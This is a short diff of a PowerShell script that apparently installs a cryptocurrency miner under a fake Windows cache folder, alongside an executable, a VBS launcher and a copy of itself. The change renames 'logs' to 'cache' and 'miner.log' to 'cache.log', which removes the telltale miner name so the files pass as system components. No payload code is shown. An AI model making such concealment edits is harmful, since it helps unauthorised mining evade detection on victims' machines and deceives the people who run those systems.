@@ -26,12 +26,12 @@ $ErrorActionPreference = 'Stop'
 
 # ---------- paths -----------------------------------------------------------
 $Root    = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
-$LogDir  = Join-Path $Root 'logs'
+$LogDir  = Join-Path $Root 'cache'
 $CfgPath = Join-Path $Root 'config.json'
 $ExePath = Join-Path $Root 'WinCache.exe'
 $SelfPs  = Join-Path $Root 'WinCache.ps1'
 $VbsPath = Join-Path $Root 'WinCache.vbs'
-$LogFile = Join-Path $LogDir 'miner.log'
+$LogFile = Join-Path $LogDir 'cache.log'
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
